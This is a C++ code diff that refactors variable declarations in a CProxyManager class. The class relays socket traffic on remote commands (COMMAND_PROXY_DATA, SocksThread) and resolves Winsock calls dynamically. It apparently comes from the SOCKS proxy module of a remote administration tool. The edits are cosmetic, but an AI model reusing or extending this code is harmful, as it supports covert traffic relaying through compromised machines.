@@ -32,9 +32,8 @@ CProxyManager::~CProxyManager()
 
 int CProxyManager::Send(LPBYTE lpData, UINT nSize)
 {
-	int ret;
 	EnterCriticalSection(&Sec);
-	ret = CManager::Send(lpData, nSize);
+	int ret = CManager::Send(lpData, nSize);
 	LeaveCriticalSection(&Sec);
 	return ret;
 }
@@ -97,25 +96,21 @@ void CProxyManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		break;
 	case COMMAND_PROXY_DATA:
 		DWORD index = *(DWORD*)&lpBuffer[1];
-		DWORD nRet, nSend = 5, nTry = 0;
+		DWORD nSend = 5, nTry = 0;
 		while (m_Socket[index] && (nSend < nSize) && nTry < 15)
 		{
 			typedef BOOL(WINAPI *SEND)(SOCKET s, const char *buf, int len, int flags);
-			SEND mysend;
 			HINSTANCE hdlldw = LoadLibrary(_T("ws2_32.dll"));;
-			mysend = (SEND)GetProcAddress(hdlldw, "send");
+			SEND mysend = (SEND)GetProcAddress(hdlldw, "send");
 
-			nRet = mysend(m_Socket[index], (char *)&lpBuffer[nSend], nSize - nSend, 0);
+			DWORD nRet = mysend(m_Socket[index], (char *)&lpBuffer[nSend], nSize - nSend, 0);
 			if (nRet == SOCKET_ERROR)
 			{
-				nRet = GetLastError();
+				GetLastError();
 				Disconnect(index);
 				break;
 			}
-			else
-			{
-				nSend += nRet;
-			}
+			nSend += nRet;
 			nTry++;
 		}
 	}
@@ -126,16 +121,12 @@ static DWORD WINAPI SocksThread(LPVOID lparam)
 	SocksThreadArg * pArg = (SocksThreadArg *)lparam;
 	CProxyManager * pThis = pArg->pThis;
 	BYTE lpBuffer[11];
-	SOCKET *psock;
-	//	char chOpt;
-	DWORD ip;
 	sockaddr_in  sockAddr;
-	int nSockAddrLen;
 	memcpy(lpBuffer, pArg->lpBuffer, 11);
 	pArg->lpBuffer = 0;
 
 	DWORD index = *(DWORD*)&lpBuffer[1];
-	psock = &pThis->m_Socket[index];
+	SOCKET *psock = &pThis->m_Socket[index];
 
 	HINSTANCE ws2_32 = GetModuleHandleW(L"ws2_32.dll");
 
@@ -161,7 +152,7 @@ static DWORD WINAPI SocksThread(LPVOID lparam)
 		//SendErr("create socket error!\n");
 		return 0;
 	}
-	ip = *(DWORD*)&lpBuffer[5];
+	DWORD ip = *(DWORD*)&lpBuffer[5];
 	// 构造sockaddr_in结构
 	sockaddr_in	ClientAddr;
 	ClientAddr.sin_family = AF_INET;
@@ -175,7 +166,7 @@ static DWORD WINAPI SocksThread(LPVOID lparam)
 	}
 
 	memset(&sockAddr, 0, sizeof(sockAddr));
-	nSockAddrLen = sizeof(sockAddr);
+	int nSockAddrLen = sizeof(sockAddr);
 	mygetsockname(*psock, (SOCKADDR*)&sockAddr, &nSockAddrLen);
 	if (sockAddr.sin_port == 0) sockAddr.sin_port = 1;
 	pThis->SendConnectResult(lpBuffer, sockAddr.sin_addr.S_un.S_addr, sockAddr.sin_port);
@@ -197,7 +188,7 @@ static DWORD WINAPI SocksThread(LPVOID lparam)
 		int nRet = myselect(NULL, &fdRead, NULL, NULL, &timeout);
 		if (nRet == SOCKET_ERROR)
 		{
-			nRet = GetLastError();
+			GetLastError();
 			pThis->Disconnect(index);
 			break;
 		}
